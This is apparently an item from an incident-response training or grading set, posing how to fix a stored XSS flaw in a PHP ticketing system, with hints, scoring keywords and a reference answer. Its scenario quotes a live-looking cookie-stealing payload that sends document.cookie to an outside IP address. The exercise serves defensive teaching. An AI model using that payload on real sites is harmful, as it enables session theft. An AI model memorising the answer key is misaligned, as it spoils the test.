- id: vulnerability_patching_phase_3
  phase_type: eradication
  title: Vulnerability Patching — Phase 3
  situation: 'Found it: ticket #4521 submitted by Marketing user ''mike.jones'' contains: <img src=x onerror="new Image().src=''http://92.38.176.xx/c?c=''+document.cookie"> The ticket system''s PHP renders ticket descriptions with echo $description (no escaping). Mike Jones says he received an email with a ''promotional offer'' and pasted the content into the ticket form.'
  prompt: How do you fix this stored XSS vulnerability?
  guidance:
    what: Confirm the root cause and remove the artifacts that would let the attacker return.
    action: How do you fix this stored XSS vulnerability?
    why: The incident is not over until the attacker's footholds are gone.
  hint: 'Look beyond the visible payload for persistence, stolen credentials, and the original entry path. Focus: Vulnerability Patching — Phase 3. Asset in scope: hr.internal.acmecorp.com.'
  hints:
  - Update detection rules, playbooks, and training from this incident.
  ideal_concepts:
  - patch php
  - php code
  - code htmlspecialchars
  - htmlspecialchars user
  - user input
  - input rendering
  - rendering add
  - content-security-policy header
  reference_answer: |-
    Patch the PHP code to use htmlspecialchars() on all user input before rendering; add Content-Security-Policy header; audit the rest of the application for similar patterns

    Why: Root cause fix (output encoding) + defense-in-depth (CSP) + scope check for other vulns.
